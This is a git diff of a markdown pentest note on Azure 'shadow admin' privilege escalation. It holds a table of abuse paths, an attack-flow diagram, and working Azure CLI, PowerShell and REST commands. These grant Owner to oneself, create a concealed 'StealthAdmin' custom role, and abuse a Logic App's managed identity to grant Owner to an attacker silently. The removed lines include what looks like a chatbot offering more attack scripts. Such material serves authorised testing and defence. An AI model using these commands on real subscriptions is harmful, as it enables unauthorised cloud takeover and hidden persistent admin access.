@@ -1,10 +1,6 @@
-# Azure Shadow Admin Techniques 
+# Azure Shadow Admin Techniques
 
-Shadow Admins are users or entities that do **not appear to have admin
-rights**, but can escalate or abuse misconfigured privileges to **gain
-full control** over Azure resources.
-
-**Azure Equivalent Shadow Admin Escalation Paths**
+Shadow Admins are users or entities that do **not appear to have admin rights**, but can escalate or abuse misconfigured privileges to **gain full control** over Azure resources.
 
 | **Technique** | **Azure Equivalent** | **Pentest Abuse Flow** |
 |----|----|----|
@@ -22,55 +18,59 @@ full control** over Azure resources.
 | **Create or Modify Custom Role** | roleDefinitions/write | Create new custom role with hidden admin access and assign it. |
 | **Create/Invoke Logic App or Azure Function** | With Microsoft.Web/sites/\* or Microsoft.Logic/workflows/\* permissions | Backdoor automation triggered on schedule or via webhook. |
 
-## Example Attack Flow: Azure Shadow Admin via Logic App
+## Attack Flow: Azure Shadow Admin via Logic App
 
-1.  **Get Contributor on Resource Group**
+```
+Attacker compromises User-1
+        │
+        ▼
+User-1 = Contributor
+        │
+        ▼
+User-1 can modify an existing Logic App
+        │
+        ▼
+Logic App executes using a Managed Identity
+that already has Owner permissions
+        │
+        ▼
+Logic App calls ARM REST API
+        │
+        ▼
+Creates a new Owner role assignment
+        │
+        ▼
+Attacker gains Owner
+```
 
-2.  **Deploy Logic App that runs ARM REST API**\
-    → Assigns "Owner" role to attacker's user
+### 1. Escalate Privileges by Assigning “Owner” to Yourself
 
-3.  **Trigger Logic App**
-
-4.  **Attacker now has full admin access across subscription or scope**
-
-Would you like a PowerShell or CLI script set to automate some of these
-Shadow Admin techniques?
-
-## Shadow Admin Techniques: Azure CLI / PowerShell
-
-Here is a set of **Azure CLI and PowerShell** scripts and commands for
-exploiting **Shadow Admin** scenarios in an **Azure Cloud Penetration
-Test**. These assume you’ve already obtained some level of access (e.g.,
-Contributor, Logic App contributor, or similar):
-
-**1. Escalate Privileges by Assigning “Owner” to Yourself**
-
-**Requirement**: User Access Administrator or permission to assign roles
-(Microsoft.Authorization/roleAssignments/write)
+**Requirement**: User Access Administrator or permission to assign roles (Microsoft.Authorization/roleAssignments/write)
 
 **Azure CLI:**
 
+```bash
 az role assignment create \\
-
 --assignee \$(az ad signed-in-user show --query objectId -o tsv) \\
-
 --role "Owner" \\
-
 --scope /subscriptions/\<subscription-id\>
+```
 
 **PowerShell:**
 
+```PS
 \$me = az ad signed-in-user show --query objectId -o tsv
 
-New-AzRoleAssignment -ObjectId \$me -RoleDefinitionName "Owner" -Scope
-"/subscriptions/\<subscription-id\>"
+New-AzRoleAssignment -ObjectId \$me -RoleDefinitionName "Owner" -Scope "/subscriptions/\<subscription-id\>"
+```
 
-**🧱 2. Create Custom Role with Full Permissions and Assign**
+### 🧱 2. Create Custom Role with Full Permissions and Assign
 
 **Requirement**: Microsoft.Authorization/roleDefinitions/write
 
 **Azure CLI:**
 
+```bash
 az role definition create --role-definition '{
 
 "Name": "StealthAdmin",
@@ -91,36 +91,32 @@ Then assign:
 
 az role assignment create --assignee \<attacker-object-id\> --role
 "StealthAdmin" --scope /subscriptions/\<subscription-id\>
+```
 
-**🔁 3. Abuse Logic App to Assign Admin Role**
+### 🔁 3. Abuse Logic App to Assign Admin Role
 
 **Requirement**: Contributor on Resource Group + Logic App permissions
 
 **Step-by-step:**
 
-1.  Create a Logic App via ARM template or CLI
+1. Create a Logic App via ARM template or CLI
+2. Logic App calls Azure Management REST API:
 
-2.  Logic App calls Azure Management REST API:
+ ```JSON
+        POST
+        https://management.azure.com/subscriptions/\<sub-id\>/providers/Microsoft.Authorization/roleAssignments/\<guid\>?api-version=2022-04-01
 
-POST
-https://management.azure.com/subscriptions/\<sub-id\>/providers/Microsoft.Authorization/roleAssignments/\<guid\>?api-version=2022-04-01
+        Body:
+        {
+            "properties": {
+            "roleDefinitionId": "/subscriptions/\<sub-id\>/providers/Microsoft.Authorization/roleDefinitions/\<owner-role-id\>",
+            "principalId": "\<attacker-object-id\>"
+            }
 
-Body:
+        }
+        ```
 
-{
-
-"properties": {
-
-"roleDefinitionId":
-"/subscriptions/\<sub-id\>/providers/Microsoft.Authorization/roleDefinitions/\<owner-role-id\>",
-
-"principalId": "\<attacker-object-id\>"
-
-}
-
-}
-
-3.  Trigger Logic App
+3. Trigger Logic App
 
 You now have “Owner” rights silently granted via automation.
 
